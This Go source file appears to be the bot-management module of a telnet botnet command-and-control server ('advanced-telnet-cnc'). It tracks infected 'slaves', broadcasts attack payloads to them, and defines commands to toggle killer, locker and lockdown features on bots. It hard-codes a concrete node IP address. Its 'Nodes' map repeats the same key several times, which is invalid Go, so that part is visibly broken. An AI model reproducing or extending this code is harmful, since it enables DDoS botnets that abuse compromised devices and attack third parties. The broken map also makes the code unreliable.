package slave_v1

import (
	"advanced-telnet-cnc/source/config"
	"encoding/binary"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

var (
	id     = 0
	Slaves = make(map[int]*Client)
	mutex  = sync.Mutex{}

	Add    = make(chan *Client, 512)
	Delete = make(chan *Client, 512)

	Nodes = map[string]string{
		"194.169.175.43": "194.169.175.43",
		"194.169.175.43":    "178.2x.xx.xx",
		"194.169.175.43":    "195.2.xx.xxx",
		"194.169.175.43":   "46.1xx.xx.xxx",
		"194.169.175.43":  "62.1xx.xxx.xxx",
	}
)

var (
	UPDATE_PROC = []byte{1}

	ENABLE_KILLER  = []byte{2, 1}
	DISABLE_KILLER = []byte{2, 2}

	ENABLE_LOCKER  = []byte{3, 1}
	DISABLE_LOCKER = []byte{3, 2}

	ENABLE_LOCKDOWN  = []byte{4, 1}
	DISABLE_LOCKDOWN = []byte{4, 2}
)

type Client struct {
	ID int
	net.Conn
	Source       string
	OriginalName string

	NodeIP   string
	NodeName string
}

func New(slave *Client) {
	id++
	slave.ID = id
	slave.OriginalName = slave.Source
	for _, name := range config.Slave.SlaveName {
		slave.Source = strings.ReplaceAll(slave.Source, name.OldName, name.NewName)
	}

	port, _, err := net.SplitHostPort(slave.RemoteAddr().String())
	if err != nil {
		return
	}

	name, exists := Nodes[port]
	if exists {
		slave.NodeName = name
		slave.NodeIP = port
		config.Logger.Info("Added client", "node", slave.NodeIP, "source", slave.Source)
		Slaves[slave.ID] = slave
		return
	}

	slave.NodeName = Nodes["194.169.175.43"]
	slave.NodeIP = "194.169.175.43"

	config.Logger.Info("Added client", "remote", slave.Conn.RemoteAddr(), "source", slave.Source)

	Slaves[slave.ID] = slave
}

func (c *Client) Remove() {
	mutex.Lock()
	defer mutex.Unlock()

	delete(Slaves, c.ID)
	config.Logger.Info("Deleted client", "remote", c.Conn.RemoteAddr(), "Source", c.Source)
}

func BroadcastAttack(payload []byte, devices int, group string) {
	mutex.Lock()
	defer mutex.Unlock()

	for i, slave := range Slaves {
		if i > devices && devices != -1 {
			break
		}

		if group == "" || group == slave.Source {
			slave.Write(payload)
		}
	}
}

func Broadcast(payload []byte, devices int, group string) int {
	var sentTo = 0
	mutex.Lock()
	defer mutex.Unlock()

	for i, slave := range Slaves {
		if i > devices && devices != -1 {
			break
		}

		if group == "" || group == slave.Source {
			lenBuf := make([]byte, 2)
			binary.BigEndian.PutUint16(lenBuf, uint16(len(payload)))
			buf := append(lenBuf, payload...)
			slave.Write(buf)
			sentTo++
		}
	}

	return sentTo
}

func Count() int {
	mutex.Lock()
	defer mutex.Unlock()

	return len(Slaves)
}

func Distribution() map[string]int {
	mutex.Lock()
	defer mutex.Unlock()

	res := make(map[string]int)

	for _, slave := range Slaves {
		if ok, _ := res[slave.Source]; ok > 0 {
			res[slave.Source]++
		} else {
			res[slave.Source] = 1
		}
	}

	return res
}

func worker() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-Add:
			New(add)
		case del := <-Delete:
			del.Remove()
		}
	}
}
